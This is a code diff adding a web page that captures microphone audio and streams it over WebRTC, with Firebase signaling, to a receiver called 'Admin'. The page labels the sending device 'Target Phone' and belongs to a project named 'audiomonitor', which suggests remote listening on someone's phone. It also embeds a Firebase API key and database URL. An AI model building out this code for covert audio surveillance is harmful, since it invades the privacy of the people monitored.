@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sender - Send Audio</title>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
+</head>
+<body style="text-align:center; background: #eee; padding-top: 50px; font-family: sans-serif;">
+    <h3 id="status">Target Phone: Connecting to Firebase...</h3>
+    <p>This page sends audio to the receiver.</p>
+    
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBGnVbP3NoTNtShKrYBCcb58ki1faBZeTI",
+            authDomain: "audiomonitor-1bc41.firebaseapp.com",
+            databaseURL: "https://audiomonitor-1bc41-default-rtdb.firebaseio.com",
+            projectId: "audiomonitor-1bc41",
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database().ref('calls/store');
+
+        let pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+
+        async function init() {
+            try {
+                // মাইক্রোফোন এক্সেস নেওয়া
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                stream.getTracks().forEach(track => pc.addTrack(track, stream));
+                document.getElementById('status').innerText = "Mic Active. Waiting for Admin...";
+
+                pc.onicecandidate = e => {
+                    if (e.candidate) db.child('senderIce').push(e.candidate.toJSON());
+                };
+
+                // রিসিভার (Admin) থেকে অফার আসলে উত্তর (Answer) পাঠানো
+                db.child('offer').on('value', async snapshot => {
+                    const sdp = snapshot.val();
+                    if (sdp && !pc.remoteDescription) {
+                        document.getElementById('status').innerText = "Received Offer. Sending Answer...";
+                        await pc.setRemoteDescription(new RTCSessionDescription({ type: 'offer', sdp: sdp }));
+                        const answer = await pc.createAnswer();
+                        await pc.setLocalDescription(answer);
+                        db.update({ answer: answer.sdp });
+                    }
+                });
+
+                db.child('receiverIce').on('child_added', snapshot => {
+                    pc.addIceCandidate(new RTCIceCandidate(snapshot.val()));
+                });
+            } catch (err) {
+                document.getElementById('status').innerText = "Mic Error: " + err.message;
+            }
+        }
+
+        init();
+    </script>
+</body>
+</html>
